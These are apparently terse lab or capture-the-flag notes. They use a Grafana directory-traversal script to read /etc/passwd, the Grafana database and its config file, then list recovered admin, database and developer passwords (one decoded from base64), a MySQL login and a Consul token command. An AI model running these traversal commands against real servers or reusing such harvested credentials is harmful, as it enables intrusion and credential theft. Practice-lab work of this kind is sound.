```
python3 Grafana_Directory_Travesal.py -host http://10.10.11.183:3000 -file /etc/passwd
python3 Grafana_Directory_Travesal.py -host http://10.10.11.183:3000 -file /var/lib/grafana/grafana.db
python3 Grafana_Directory_Travesal.py -host http://10.10.11.183:3000 -file /etc/grafana/grafana.ini
```

# creds
```
# default admin password, can be changed before first start of grafana,  or in profile settings
admin_password = messageInABottle685427
```

db
```
dontStandSoCloseToMe63221!
```

```
mysql -u grafana -p grafana -h 10.10.11.183 -P 3306 -D local
```

```
+-----------+------------------------------------------+
| user      | pass                                     |
+-----------+------------------------------------------+
| developer | YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg== |
+-----------+------------------------------------------+
```

# creds
```
anEnglishManInNewYork027468
```

```
-consul kv put --token bb03b43b-1d81-d62b-24b5-39540ee469b5 whackywidget/db/mysql_pw $MYSQL_PASSWORD
```